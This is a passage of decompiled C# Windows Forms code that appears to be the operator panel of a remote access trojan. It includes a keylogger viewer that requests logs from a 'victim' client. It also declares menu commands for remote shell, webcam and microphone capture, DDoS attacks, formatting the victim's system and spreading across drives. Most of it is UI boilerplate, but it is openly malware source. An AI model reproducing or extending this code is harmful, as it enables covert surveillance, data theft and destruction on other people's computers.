			this.T1.ForeColor = Color.Black;
			Control arg_551_0 = this.T1;
			location = new Point(0, 24);
			arg_551_0.Location = location;
			this.T1.Name = "T1";
			Control arg_582_0 = this.T1;
			size = new Size(606, 251);
			arg_582_0.Size = size;
			this.T1.TabIndex = 2;
			this.T1.Text = "";
			this.ContextMenuStrip2.Items.AddRange(new ToolStripItem[]
			{
				this.ToolStripMenuItem1,
				this.ToolStripMenuItem2,
				this.ToolStripMenuItem3
			});
			this.ContextMenuStrip2.Name = "ContextMenuStrip1";
			Control arg_607_0 = this.ContextMenuStrip2;
			size = new Size(123, 70);
			arg_607_0.Size = size;
			this.ToolStripMenuItem1.BackColor = Color.Black;
			this.ToolStripMenuItem1.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem1.Image");
			this.ToolStripMenuItem1.Name = "ToolStripMenuItem1";
			ToolStripItem arg_670_0 = this.ToolStripMenuItem1;
			size = new Size(122, 22);
			arg_670_0.Size = size;
			this.ToolStripMenuItem1.Text = "Select All";
			this.ToolStripMenuItem2.BackColor = Color.Black;
			this.ToolStripMenuItem2.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem2.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem2.Image");
			this.ToolStripMenuItem2.Name = "ToolStripMenuItem2";
			ToolStripItem arg_6EA_0 = this.ToolStripMenuItem2;
			size = new Size(122, 22);
			arg_6EA_0.Size = size;
			this.ToolStripMenuItem2.Text = "Copy";
			this.ToolStripMenuItem3.BackColor = Color.Black;
			this.ToolStripMenuItem3.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem3.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem3.Image");
			this.ToolStripMenuItem3.Name = "ToolStripMenuItem3";
			ToolStripItem arg_764_0 = this.ToolStripMenuItem3;
			size = new Size(122, 22);
			arg_764_0.Size = size;
			this.ToolStripMenuItem3.Text = "Find";
			this.ProgressBar2.Dock = DockStyle.Bottom;
			Control arg_79D_0 = this.ProgressBar2;
			location = new Point(0, 265);
			arg_79D_0.Location = location;
			this.ProgressBar2.Name = "ProgressBar2";
			Control arg_7CB_0 = this.ProgressBar2;
			size = new Size(606, 10);
			arg_7CB_0.Size = size;
			this.ProgressBar2.TabIndex = 108;
			this.TFind.Anchor = (AnchorStyles.Top | AnchorStyles.Bottom);
			this.TFind.BackColor = Color.Black;
			this.TFind.BorderStyle = BorderStyle.FixedSingle;
			this.TFind.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.TFind.ForeColor = Color.Yellow;
			Control arg_84E_0 = this.TFind;
			location = new Point(812, 0);
			arg_84E_0.Location = location;
			this.TFind.Name = "TFind";
			Control arg_879_0 = this.TFind;
			size = new Size(10, 22);
			arg_879_0.Size = size;
			this.TFind.TabIndex = 109;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			size = new Size(606, 275);
			this.ClientSize = size;
			this.Controls.Add(this.TFind);
			this.Controls.Add(this.ProgressBar2);
			this.Controls.Add(this.T1);
			this.Controls.Add(this.MenuStrip1);
			this.Controls.Add(this.ProgressBar1);
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.MainMenuStrip = this.MenuStrip1;
			this.Name = "Frm_KeyLooger";
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "keylogger";
			this.MenuStrip1.ResumeLayout(false);
			this.MenuStrip1.PerformLayout();
			this.ContextMenuStrip2.ResumeLayout(false);
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.T1.Copy();
		}

		private void FindToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		public void insert(string T)
		{
			bool flag = T.StartsWith("\u0001") & T.EndsWith("\u0001");
			if (flag)
			{
				this.T1.SelectionFont = new Font(this.T1.Font, FontStyle.Bold);
				this.T1.SelectionColor = Color.Black;
				this.T1.AppendText("\r\n[ " + T.Replace("\u0001", "") + "]\r\n");
			}
			else
			{
				this.T1.SelectionFont = this.T1.Font;
				this.T1.SelectionColor = Color.Black;
				this.T1.AppendText(T + "\r\n");
			}
		}

		private void ReToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				this.c.Send("kl");
				this.ReToolStripMenuItem.Enabled = false;
			}
			catch (Exception expr_22)
			{
				ProjectData.SetProjectError(expr_22);
				Exception projectError = expr_22;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void SelectAllToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.T1.SelectAll();
		}

		private void T1_TextChanged(object sender, EventArgs e)
		{
		}

		private void SearchToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.T1.Find(this.TFind.Text, checked(this.T1.SelectionStart + this.T1.SelectionLength), RichTextBoxFinds.None) == -1;
			if (flag)
			{
				this.T1.Find(this.TFind.Text, 0, RichTextBoxFinds.None);
			}
		}

		private void FixBackSpaceToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					int num = 1;
					IDataObject dataObject = Clipboard.GetDataObject();
					this.T1.ReadOnly = false;
					while (num != -1)
					{
						num = this.T1.Find("[Back]", num, RichTextBoxFinds.None);
						bool flag = num > 0;
						if (flag)
						{
							string left = this.T1.Text[num - 1].ToString();
							flag = (Operators.CompareString(left, "]", false) == 0 || Operators.CompareString(left, "\n", false) == 0);
							if (flag)
							{
								this.T1.Select(num, "[back]".Length);
								this.T1.Cut();
							}
							else
							{
								this.T1.Select(num - 1, "[back]".Length + 1);
								this.T1.Cut();
							}
						}
					}
					Clipboard.SetDataObject(dataObject);
					this.T1.ReadOnly = true;
				}
				catch (Exception expr_FA)
				{
					ProjectData.SetProjectError(expr_FA);
					ProjectData.ClearProjectError();
				}
			}
		}

		private void ClearLogToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.T1.Text = string.Empty;
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
		}

		private void Frm_KeyLooger_Load(object sender, EventArgs e)
		{
		}

		private void ToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			bool flag = Interaction.InputBox("Enter Word To Find", "Search", "", -1, -1).Length != 0;
			if (flag)
			{
				lock (this)
				{
					this.T1.SelectedText = "";
				}
			}
		}

		private void ToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			this.T1.Copy();
		}

		private void SelectAllToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
		}

		private void VictimColorToolStripMenuItem_Click(object sender, EventArgs e)
		{
			ColorDialog colorDialog = new ColorDialog();
			colorDialog.ShowDialog();
			this.T1.ForeColor = colorDialog.Color;
		}

		private void ColorLToolStripMenuItem_Click(object sender, EventArgs e)
		{
			ColorDialog colorDialog = new ColorDialog();
			colorDialog.ShowDialog();
			this.T1.BackColor = colorDialog.Color;
			this.MenuStrip1.BackColor = colorDialog.Color;
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using nj.My;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Frm_Main : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("Timer1")]
		private System.Timers.Timer _Timer1;

		[AccessedThroughProperty("IMG")]
		private ImageList _IMG;

		[AccessedThroughProperty("Timer2")]
		private System.Windows.Forms.Timer _Timer2;

		[AccessedThroughProperty("OpenFolderToolStripMenuItem")]
		private ToolStripMenuItem _OpenFolderToolStripMenuItem;

		[AccessedThroughProperty("BottomToolStripPanel")]
		private ToolStripPanel _BottomToolStripPanel;

		[AccessedThroughProperty("TopToolStripPanel")]
		private ToolStripPanel _TopToolStripPanel;

		[AccessedThroughProperty("RightToolStripPanel")]
		private ToolStripPanel _RightToolStripPanel;

		[AccessedThroughProperty("LeftToolStripPanel")]
		private ToolStripPanel _LeftToolStripPanel;

		[AccessedThroughProperty("ContentPanel")]
		private ToolStripContentPanel _ContentPanel;

		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip _ContextMenuStrip1;

		[AccessedThroughProperty("RunFileToolStripMenuItem")]
		private ToolStripMenuItem _RunFileToolStripMenuItem;

		[AccessedThroughProperty("FromLinkToolStripMenuItem")]
		private ToolStripMenuItem _FromLinkToolStripMenuItem;

		[AccessedThroughProperty("FromDiskToolStripMenuItem")]
		private ToolStripMenuItem _FromDiskToolStripMenuItem;

		[AccessedThroughProperty("ScriptToolStripMenuItem")]
		private ToolStripMenuItem _ScriptToolStripMenuItem;

		[AccessedThroughProperty("RemoteShellToolStripMenuItem")]
		private ToolStripMenuItem _RemoteShellToolStripMenuItem;

		[AccessedThroughProperty("OpenChatToolStripMenuItem")]
		private ToolStripMenuItem _OpenChatToolStripMenuItem;

		[AccessedThroughProperty("ServerToolStripMenuItem")]
		private ToolStripMenuItem _ServerToolStripMenuItem;

		[AccessedThroughProperty("UpdateToolStripMenuItem")]
		private ToolStripMenuItem _UpdateToolStripMenuItem;

		[AccessedThroughProperty("FromDISKToolStripMenuItem1")]
		private ToolStripMenuItem _FromDISKToolStripMenuItem1;

		[AccessedThroughProperty("FromLINKToolStripMenuItem1")]
		private ToolStripMenuItem _FromLINKToolStripMenuItem1;

		[AccessedThroughProperty("UninstallToolStripMenuItem")]
		private ToolStripMenuItem _UninstallToolStripMenuItem;

		[AccessedThroughProperty("RestartToolStripMenuItem")]
		private ToolStripMenuItem _RestartToolStripMenuItem;

		[AccessedThroughProperty("CloseToolStripMenuItem")]
		private ToolStripMenuItem _CloseToolStripMenuItem;

		[AccessedThroughProperty("DisconnectToolStripMenuItem")]
		private ToolStripMenuItem _DisconnectToolStripMenuItem;

		[AccessedThroughProperty("RenameToolStripMenuItem")]
		private ToolStripMenuItem _RenameToolStripMenuItem;

		[AccessedThroughProperty("ToolStripMenuItem2")]
		private ToolStripMenuItem _ToolStripMenuItem2;

		[AccessedThroughProperty("DDosAttickToolStripMenuItem")]
		private ToolStripMenuItem _DDosAttickToolStripMenuItem;

		[AccessedThroughProperty("FormatSystemToolStripMenuItem")]
		private ToolStripMenuItem _FormatSystemToolStripMenuItem;

		[AccessedThroughProperty("NotifyIcon1")]
		private NotifyIcon _NotifyIcon1;

		[AccessedThroughProperty("ExtrasToolStripMenuItem")]
		private ToolStripMenuItem _ExtrasToolStripMenuItem;

		[AccessedThroughProperty("SendMsgboxToolStripMenuItem")]
		private ToolStripMenuItem _SendMsgboxToolStripMenuItem;

		[AccessedThroughProperty("ComputerToolStripMenuItem1")]
		private ToolStripMenuItem _ComputerToolStripMenuItem1;

		[AccessedThroughProperty("ShutDownToolStripMenuItem1")]
		private ToolStripMenuItem _ShutDownToolStripMenuItem1;

		[AccessedThroughProperty("RestartToolStripMenuItem1")]
		private ToolStripMenuItem _RestartToolStripMenuItem1;

		[AccessedThroughProperty("im1")]
		private ImageList _im1;

		[AccessedThroughProperty("CM3")]
		private ContextMenuStrip _CM3;

		[AccessedThroughProperty("HideMonitorToolStripMenuItem")]
		private ToolStripMenuItem _HideMonitorToolStripMenuItem;

		[AccessedThroughProperty("ShowMonitorToolStripMenuItem")]
		private ToolStripMenuItem _ShowMonitorToolStripMenuItem;

		[AccessedThroughProperty("RemoteDesktopToolStripMenuItem")]
		private ToolStripMenuItem _RemoteDesktopToolStripMenuItem;

		[AccessedThroughProperty("RemoteCamToolStripMenuItem")]
		private ToolStripMenuItem _RemoteCamToolStripMenuItem;

		[AccessedThroughProperty("CDToolStripMenuItem")]
		private ToolStripMenuItem _CDToolStripMenuItem;

		[AccessedThroughProperty("OpenCDToolStripMenuItem")]
		private ToolStripMenuItem _OpenCDToolStripMenuItem;

		[AccessedThroughProperty("CloseCDToolStripMenuItem")]
		private ToolStripMenuItem _CloseCDToolStripMenuItem;

		[AccessedThroughProperty("TextToSpeechToolStripMenuItem")]
		private ToolStripMenuItem _TextToSpeechToolStripMenuItem;

		[AccessedThroughProperty("ErrorMessageToolStripMenuItem")]
		private ToolStripMenuItem _ErrorMessageToolStripMenuItem;

		[AccessedThroughProperty("InformationMessageToolStripMenuItem")]
		private ToolStripMenuItem _InformationMessageToolStripMenuItem;

		[AccessedThroughProperty("QuestionMessageToolStripMenuItem")]
		private ToolStripMenuItem _QuestionMessageToolStripMenuItem;

		[AccessedThroughProperty("ExlamationMessageToolStripMenuItem")]
		private ToolStripMenuItem _ExlamationMessageToolStripMenuItem;

		[AccessedThroughProperty("LogOffToolStripMenuItem")]
		private ToolStripMenuItem _LogOffToolStripMenuItem;

		[AccessedThroughProperty("P1")]
		private PictureBox _P1;

		[AccessedThroughProperty("WebsiteToolStripMenuItem")]
		private ToolStripMenuItem _WebsiteToolStripMenuItem;

		[AccessedThroughProperty("OpenWebPageToolStripMenuItem1")]
		private ToolStripMenuItem _OpenWebPageToolStripMenuItem1;

		[AccessedThroughProperty("BlockWebpageToolStripMenuItem")]
		private ToolStripMenuItem _BlockWebpageToolStripMenuItem;

		[AccessedThroughProperty("SpreadInHardDriveToolStripMenuItem1")]
		private ToolStripMenuItem _SpreadInHardDriveToolStripMenuItem1;

		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		[AccessedThroughProperty("Panel2")]
		private Panel _Panel2;

		[AccessedThroughProperty("TaskbarToolStripMenuItem")]
		private ToolStripMenuItem _TaskbarToolStripMenuItem;

		[AccessedThroughProperty("HideToolStripMenuItem")]
		private ToolStripMenuItem _HideToolStripMenuItem;

		[AccessedThroughProperty("ShowToolStripMenuItem1")]
		private ToolStripMenuItem _ShowToolStripMenuItem1;

		[AccessedThroughProperty("Timer3")]
		private System.Windows.Forms.Timer _Timer3;

		[AccessedThroughProperty("ecran")]
		private System.Windows.Forms.Timer _ecran;

		[AccessedThroughProperty("ToolStripSeparator1")]
		private ToolStripSeparator _ToolStripSeparator1;

		[AccessedThroughProperty("ChangeVictimColorToolStripMenuItem")]
		private ToolStripMenuItem _ChangeVictimColorToolStripMenuItem;

		[AccessedThroughProperty("ToolStripSeparator2")]
		private ToolStripSeparator _ToolStripSeparator2;

		[AccessedThroughProperty("ToolStripSeparator3")]
		private ToolStripSeparator _ToolStripSeparator3;

		[AccessedThroughProperty("InjectToDesctopShortcutToolStripMenuItem")]
		private ToolStripMenuItem _InjectToDesctopShortcutToolStripMenuItem;

		[AccessedThroughProperty("ToolStripSeparator4")]
		private ToolStripSeparator _ToolStripSeparator4;

		[AccessedThroughProperty("ToolStripSeparator6")]
		private ToolStripSeparator _ToolStripSeparator6;

		[AccessedThroughProperty("VictimInformationToolStripMenuItem")]
		private ToolStripMenuItem _VictimInformationToolStripMenuItem;

		[AccessedThroughProperty("ImageList1")]
		private ImageList _ImageList1;

		[AccessedThroughProperty("Logs1")]
		private logs _Logs1;

		[AccessedThroughProperty("ContextMenuStrip3")]
		private ContextMenuStrip _ContextMenuStrip3;

		[AccessedThroughProperty("ManagerToolStripMenuItem")]
		private ToolStripMenuItem _ManagerToolStripMenuItem;

		[AccessedThroughProperty("HhhhhToolStripMenuItem")]
		private ToolStripMenuItem _HhhhhToolStripMenuItem;

		[AccessedThroughProperty("HhhhhhToolStripMenuItem")]
		private ToolStripMenuItem _HhhhhhToolStripMenuItem;

		[AccessedThroughProperty("YyyyyyyyToolStripMenuItem")]
		private ToolStripMenuItem _YyyyyyyyToolStripMenuItem;

		[AccessedThroughProperty("HhhhhhhhToolStripMenuItem")]
		private ToolStripMenuItem _HhhhhhhhToolStripMenuItem;

		[AccessedThroughProperty("GgggggggToolStripMenuItem")]
		private ToolStripMenuItem _GgggggggToolStripMenuItem;

		[AccessedThroughProperty("ServicesToolStripMenuItem")]
		private ToolStripMenuItem _ServicesToolStripMenuItem;

		[AccessedThroughProperty("MensagemChatToolStripMenuItem")]
		private ToolStripMenuItem _MensagemChatToolStripMenuItem;

		[AccessedThroughProperty("ToolStripMenuItem1")]
		private ToolStripMenuItem _ToolStripMenuItem1;

		[AccessedThroughProperty("ToolStripMenuItem3")]
		private ToolStripMenuItem _ToolStripMenuItem3;

		[AccessedThroughProperty("ToolStripMenuItem8")]
		private ToolStripMenuItem _ToolStripMenuItem8;

		[AccessedThroughProperty("ToolStripMenuItem13")]
		private ToolStripMenuItem _ToolStripMenuItem13;

		[AccessedThroughProperty("ToolStripMenuItem14")]
		private ToolStripMenuItem _ToolStripMenuItem14;

		[AccessedThroughProperty("ToolStripMenuItem15")]
		private ToolStripMenuItem _ToolStripMenuItem15;

		[AccessedThroughProperty("ToolStripMenuItem16")]
		private ToolStripMenuItem _ToolStripMenuItem16;

		[AccessedThroughProperty("ToolStripMenuItem17")]
		private ToolStripMenuItem _ToolStripMenuItem17;

		[AccessedThroughProperty("MicrophoneToolStripMenuItem")]
		private ToolStripMenuItem _MicrophoneToolStripMenuItem;

		[AccessedThroughProperty("ToolStripMenuItem18")]
		private ToolStripMenuItem _ToolStripMenuItem18;

		[AccessedThroughProperty("ToolStripMenuItem19")]
		private ToolStripMenuItem _ToolStripMenuItem19;

		[AccessedThroughProperty("ToolStripMenuItem20")]
		private ToolStripMenuItem _ToolStripMenuItem20;

		[AccessedThroughProperty("ToolStripMenuItem21")]
		private ToolStripMenuItem _ToolStripMenuItem21;

		[AccessedThroughProperty("ToolStripMenuItem22")]
		private ToolStripMenuItem _ToolStripMenuItem22;

		[AccessedThroughProperty("ToolStripMenuItem23")]
		private ToolStripMenuItem _ToolStripMenuItem23;

		[AccessedThroughProperty("ToolStripMenuItem24")]
		private ToolStripMenuItem _ToolStripMenuItem24;

		[AccessedThroughProperty("ToolStripMenuItem25")]
		private ToolStripMenuItem _ToolStripMenuItem25;

		[AccessedThroughProperty("ToolStripMenuItem26")]
		private ToolStripMenuItem _ToolStripMenuItem26;

		[AccessedThroughProperty("ToolStripMenuItem27")]
		private ToolStripMenuItem _ToolStripMenuItem27;

		[AccessedThroughProperty("ToolStripMenuItem28")]
		private ToolStripMenuItem _ToolStripMenuItem28;

		[AccessedThroughProperty("ToolStripMenuItem29")]
		private ToolStripMenuItem _ToolStripMenuItem29;

		[AccessedThroughProperty("YYToolStripMenuItem")]
		private ToolStripMenuItem _YYToolStripMenuItem;

		[AccessedThroughProperty("ComputadorToolStripMenuItem1")]
		private ToolStripMenuItem _ComputadorToolStripMenuItem1;

		[AccessedThroughProperty("RefreshToolStripMenuItem1")]
		private ToolStripMenuItem _RefreshToolStripMenuItem1;

		[AccessedThroughProperty("ToolStripMenuItem30")]
		private ToolStripMenuItem _ToolStripMenuItem30;

		[AccessedThroughProperty("CDPlayerToolStripMenuItem1")]
		private ToolStripMenuItem _CDPlayerToolStripMenuItem1;

		[AccessedThroughProperty("OpenCDToolStripMenuItem1")]
		private ToolStripMenuItem _OpenCDToolStripMenuItem1;

		[AccessedThroughProperty("GGGToolStripMenuItem")]
		private ToolStripMenuItem _GGGToolStripMenuItem;

		[AccessedThroughProperty("GGToolStripMenuItem")]
		private ToolStripMenuItem _GGToolStripMenuItem;

		[AccessedThroughProperty("IndexFileToolStripMenuItem1")]
		private ToolStripMenuItem _IndexFileToolStripMenuItem1;

		[AccessedThroughProperty("OpenChatToolStripMenuItem1")]
		private ToolStripMenuItem _OpenChatToolStripMenuItem1;

		[AccessedThroughProperty("LogsHackdToolStripMenuItem")]
		private ToolStripMenuItem _LogsHackdToolStripMenuItem;

		[AccessedThroughProperty("L2")]
		private LV _L2;

		[AccessedThroughProperty("ColumnHeader12")]
		private ColumnHeader _ColumnHeader12;

		[AccessedThroughProperty("ColumnHeader13")]
		private ColumnHeader _ColumnHeader13;

		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		[AccessedThroughProperty("ColumnHeader3")]
		private ColumnHeader _ColumnHeader3;

		[AccessedThroughProperty("ColumnHeader4")]
		private ColumnHeader _ColumnHeader4;

		[AccessedThroughProperty("ColumnHeader5")]
		private ColumnHeader _ColumnHeader5;

		[AccessedThroughProperty("ColumnHeader6")]
		private ColumnHeader _ColumnHeader6;

		[AccessedThroughProperty("ColumnHeader7")]
		private ColumnHeader _ColumnHeader7;

		[AccessedThroughProperty("ColumnHeader8")]
		private ColumnHeader _ColumnHeader8;

		[AccessedThroughProperty("ColumnHeader9")]
		private ColumnHeader _ColumnHeader9;

		[AccessedThroughProperty("ColumnHeader10")]
		private ColumnHeader _ColumnHeader10;

		[AccessedThroughProperty("ColumnHeader11")]
		private ColumnHeader _ColumnHeader11;

		[AccessedThroughProperty("ColumnHeader21")]
		private ColumnHeader _ColumnHeader21;

		[AccessedThroughProperty("ColumnHeader22")]
		private ColumnHeader _ColumnHeader22;

		[AccessedThroughProperty("ColumnHeader23")]
		private ColumnHeader _ColumnHeader23;

		[AccessedThroughProperty("ColumnHeader24")]
		private ColumnHeader _ColumnHeader24;

		[AccessedThroughProperty("Panel3")]
		private Panel _Panel3;

		[AccessedThroughProperty("L1V")]
		private L1V _L1V;

		[AccessedThroughProperty("ColumnHeader14")]
		private ColumnHeader _ColumnHeader14;

		[AccessedThroughProperty("ColumnHeader15")]
		private ColumnHeader _ColumnHeader15;

		[AccessedThroughProperty("ColumnHeader16")]
		private ColumnHeader _ColumnHeader16;

		[AccessedThroughProperty("ColumnHeader17")]
		private ColumnHeader _ColumnHeader17;

		[AccessedThroughProperty("ColumnHeader18")]
		private ColumnHeader _ColumnHeader18;

		[AccessedThroughProperty("ColumnHeader19")]
		private ColumnHeader _ColumnHeader19;

		[AccessedThroughProperty("ColumnHeader20")]
		private ColumnHeader _ColumnHeader20;

		[AccessedThroughProperty("TextBox3")]
		private TextBox _TextBox3;

		[AccessedThroughProperty("StatusStrip1")]
		private StatusStrip _StatusStrip1;

		[AccessedThroughProperty("ToStael1")]
		private ToolStripStatusLabel _ToStael1;

		[AccessedThroughProperty("ToolStripStatusLabel3")]
		private ToolStripStatusLabel _ToolStripStatusLabel3;

		[AccessedThroughProperty("ToolStripStatusLabel5")]
		private ToolStripStatusLabel _ToolStripStatusLabel5;

		[AccessedThroughProperty("ToolStripStatusLabel4")]
		private ToolStripStatusLabel _ToolStripStatusLabel4;

		[AccessedThroughProperty("conz")]
		private ToolStripStatusLabel _conz;

		[AccessedThroughProperty("upl")]
		private ToolStripStatusLabel _upl;

		[AccessedThroughProperty("dwn")]
		private ToolStripStatusLabel _dwn;

		[AccessedThroughProperty("To2")]
		private ToolStripStatusLabel _To2;

		[AccessedThroughProperty("Tool1")]
		private ToolStripStatusLabel _Tool1;

		[AccessedThroughProperty("Timer4")]
		private System.Windows.Forms.Timer _Timer4;

		[AccessedThroughProperty("Timer5")]
		private System.Windows.Forms.Timer _Timer5;

		[AccessedThroughProperty("ToolStripStatusLabel2")]
		private ToolStripStatusLabel _ToolStripStatusLabel2;

		[AccessedThroughProperty("ColumnHeader25")]
		private ColumnHeader _ColumnHeader25;

		[AccessedThroughProperty("ColumnHeader26")]
		private ColumnHeader _ColumnHeader26;

		[AccessedThroughProperty("ColumnHeader27")]
		private ColumnHeader _ColumnHeader27;

		[AccessedThroughProperty("ColumnHeader28")]
		private ColumnHeader _ColumnHeader28;

		[AccessedThroughProperty("ColumnHeader29")]
		private ColumnHeader _ColumnHeader29;

		[AccessedThroughProperty("ColumnHeader30")]
		private ColumnHeader _ColumnHeader30;

		[AccessedThroughProperty("ColumnHeader31")]
		private ColumnHeader _ColumnHeader31;

		[AccessedThroughProperty("ColumnHeader32")]
		private ColumnHeader _ColumnHeader32;

		[AccessedThroughProperty("ColumnHeader33")]
		private ColumnHeader _ColumnHeader33;

		[AccessedThroughProperty("ColumnHeader34")]
		private ColumnHeader _ColumnHeader34;

		[AccessedThroughProperty("ColumnHeader35")]
		private ColumnHeader _ColumnHeader35;

		[AccessedThroughProperty("ColumnHeader36")]
		private ColumnHeader _ColumnHeader36;

		[AccessedThroughProperty("ColumnHeader37")]
		private ColumnHeader _ColumnHeader37;

		[AccessedThroughProperty("IMG2")]
		private ImageList _IMG2;

		[AccessedThroughProperty("ToolStripStatusLabel6")]
		private ToolStripStatusLabel _ToolStripStatusLabel6;

		[AccessedThroughProperty("Tou")]
		private ToolStripStatusLabel _Tou;

		[AccessedThroughProperty("ToolStripStatusLabel8")]
		private ToolStripStatusLabel _ToolStripStatusLabel8;

		[AccessedThroughProperty("UploadImageToolStripMenuItem")]
		private ToolStripMenuItem _UploadImageToolStripMenuItem;

		[AccessedThroughProperty("NoIPSiteToolStripMenuItem")]
		private ToolStripMenuItem _NoIPSiteToolStripMenuItem;

		[AccessedThroughProperty("NoIPToolStripMenuItem")]
		private ToolStripMenuItem _NoIPToolStripMenuItem;

		[AccessedThroughProperty("SiteEmailToolStripMenuItem")]
		private ToolStripMenuItem _SiteEmailToolStripMenuItem;

		[AccessedThroughProperty("PortSiteToolStripMenuItem")]
		private ToolStripMenuItem _PortSiteToolStripMenuItem;

		[AccessedThroughProperty("BackColorToolStripMenuItem")]
		private ToolStripMenuItem _BackColorToolStripMenuItem;

		[AccessedThroughProperty("RRRToolStripMenuItem")]
		private ToolStripMenuItem _RRRToolStripMenuItem;

		[AccessedThroughProperty("RRRRToolStripMenuItem")]
		private ToolStripMenuItem _RRRRToolStripMenuItem;

		[AccessedThroughProperty("GridLinesToolStripMenuItem")]
		private ToolStripMenuItem _GridLinesToolStripMenuItem;

		[AccessedThroughProperty("ColorLIToolStripMenuItem")]
		private ToolStripMenuItem _ColorLIToolStripMenuItem;

		[AccessedThroughProperty("ColorLinesToolStripMenuItem")]
		private ToolStripMenuItem _ColorLinesToolStripMenuItem;

		[AccessedThroughProperty("ExlamationMessageToolStripMenuItem1")]
		private ToolStripMenuItem _ExlamationMessageToolStripMenuItem1;

		[AccessedThroughProperty("GridLinesToolStripToolStripMenuItem")]
		private ToolStripMenuItem _GridLinesToolStripToolStripMenuItem;

		[AccessedThroughProperty("RemoteDesktopToolStripMenuItem1")]
		private ToolStripMenuItem _RemoteDesktopToolStripMenuItem1;

		[AccessedThroughProperty("NyX_GroupBox1")]
		private NYX_GroupBox _NyX_GroupBox1;

		public Client CEL;

		public bool PMON;

		public int port;

		public SK S;

		public Client sk;

		internal virtual System.Timers.Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				ElapsedEventHandler value2 = new ElapsedEventHandler(this.Timer1_Elapsed);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Elapsed -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Elapsed += value2;
				}
			}
		}

		internal virtual ImageList IMG
		{
			[DebuggerNonUserCode]
			get
			{
				return this._IMG;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._IMG = value;
			}
		}

		internal virtual System.Windows.Forms.Timer Timer2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Timer2 = value;
			}
		}

		internal virtual ToolStripMenuItem OpenFolderToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenFolderToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.OpenFolderToolStripMenuItem_Click);
				bool flag = this._OpenFolderToolStripMenuItem != null;
				if (flag)
				{
					this._OpenFolderToolStripMenuItem.Click -= value2;
				}
				this._OpenFolderToolStripMenuItem = value;
				flag = (this._OpenFolderToolStripMenuItem != null);
				if (flag)
				{
					this._OpenFolderToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripPanel BottomToolStripPanel
		{
			[DebuggerNonUserCode]
			get
			{
				return this._BottomToolStripPanel;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._BottomToolStripPanel = value;
			}
		}

		internal virtual ToolStripPanel TopToolStripPanel
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TopToolStripPanel;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TopToolStripPanel = value;
			}
		}

		internal virtual ToolStripPanel RightToolStripPanel
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RightToolStripPanel;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RightToolStripPanel = value;
			}
		}

		internal virtual ToolStripPanel LeftToolStripPanel
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LeftToolStripPanel;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LeftToolStripPanel = value;
			}
		}

		internal virtual ToolStripContentPanel ContentPanel
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContentPanel;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContentPanel = value;
			}
		}

		internal virtual ContextMenuStrip ContextMenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip1 = value;
			}
		}

